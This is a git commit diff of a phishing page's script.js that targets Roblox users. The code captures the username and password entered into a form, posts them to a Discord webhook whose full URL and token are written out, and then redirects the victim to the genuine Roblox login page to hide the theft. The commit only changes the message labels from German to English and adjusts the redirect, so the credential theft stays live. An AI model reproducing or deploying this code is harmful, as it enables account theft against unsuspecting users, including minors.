bc3599759ce930711c67bccd75923efa2857dca7
Master7723 <genshin474acc@gmail.com>
2025-07-30 02:59:30 +0200

    Update script.js

--- script.js
+++ script.js
@@ -1,18 +1,16 @@
 function sendToWebhook(event) {
   event.preventDefault();
-
   const username = document.getElementById("username").value;
   const password = document.getElementById("password").value;
-
   fetch("https://discord.com/api/webhooks/1399886528976650413/8qYx68ldSTmBja7oFhQUTTxVRJy0Tv8TUG8CwfT3VILzpIsp_nkqfG5enSzVa-DeSJOI", {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
     },
     body: JSON.stringify({
-      content: `👤 Benutzername: ${username}\n🔑 Passwort: ${password}`
+      content: `👤 Username: ${username}\n🔑 Password: ${password}`
     })
   }).then(() => {
-    window.location.href = "https://www.roblox.com/de/login";
+    window.location.href = "https://www.roblox.com/login";
   });
 }
